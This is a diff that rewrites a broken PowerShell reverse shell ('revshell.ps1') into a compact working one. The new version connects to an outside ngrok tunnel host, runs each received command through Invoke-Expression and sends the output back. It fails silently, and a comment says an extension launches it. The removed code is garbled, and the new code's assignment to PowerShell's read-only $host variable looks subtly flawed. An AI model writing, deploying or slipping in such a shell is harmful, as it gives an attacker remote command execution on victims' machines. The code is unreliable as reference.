@@ -1,48 +1,36 @@
 # Reverse Shell Script (Windows) - Save as revshell.ps1
-$client = New-Object System.Net.Sockets.TCPclient("10.tcp.eu.ngrok.io", 29847)
-$stream = $client.GetStream()
+$host = "10.tcp.eu.ngrok.io"
+$port = 29847
 
-# Initialize byte array and message buffer
-$bytes = 0..65535 | ForEach-Object { 0 }
-$msg = ""
+try {
+    $client = New-Object System.Net.Sockets.TCPClient($host, $port)
+    $stream = $client.GetStream()
+    $bytes  = New-Object byte[] 65536
+    $enc    = [System.Text.Encoding]::ASCII
 
-# Main receive loop
-while (-not ($stream.DataAvailable)):
-    Start-Sleep -Milliseconds 100
+    while ($true) {
+        # Read from the socket
+        $count = $stream.Read($bytes, 0, $bytes.Length)
+        if ($count -eq 0) { break }
 
-while ($stream.DataAvailable):
-    $stream.Read($bytes, 0, $bytes.Length) | Out-Null
-    $msg += [Text.Encoding]::ASCII.GetString($bytes)
-    $bytes = 0..65535 | ForEach-Object { 0 }
-    $null = $sendbyte.Length
-    $stream.Flush()
+        $command = $enc.GetString($bytes, 0, $count).Trim()
 
-# Process received commands and send response
-Invoke-Expression $msg -CommandProcessor $ProcessCommand
-$response = $null
+        # Execute and capture output (stdout + stderr)
+        $output = Invoke-Expression $command 2>&1 | Out-String
 
-# Example basic command handling
-function ProcessCommand { param($cmd) 
-    switch($cmd) {
-        'dir' { Write-Output ('Directory: ' + (Get-ChildItem).Path) -ForegroundColor Yellow }
-        'exit' { exit }
-        default { Write-Host $cmd -ForegroundColor White }
+        # Send prompt + output back
+        $prompt = "PS $((Get-Location).Path)> "
+        $response = $output + $prompt
+        $sendBytes = $enc.GetBytes($response)
+        $stream.Write($sendBytes, 0, $sendBytes.Length)
+        $stream.Flush()
     }
 }
-
-# Handle exceptions and reconnections
-while ($true) {
-    try {
-        if ($stream.DataAvailable) { continue }
-        $response = (Invoke-Expression $msg -CommandProcessor $ProcessCommand)
-        $stream.Write([Text.Encoding]::ASCII.GetBytes($response), 0, $response.Length) | Out-Null
-    }
-    catch { 
-        if ($_.Exception.Message -match 'Reconnect') {
-            Write-Host 'Connection lost, reattempting in 10s...' -ForegroundColor Red
-            Start-Sleep -Seconds 10
-            $client = $global:client
-        }
-        else { throw }
-    }
+catch {
+    # Silent fail  extension will report the exit code
+    exit 1
+}
+finally {
+    if ($stream) { $stream.Close() }
+    if ($client) { $client.Close() }
 }
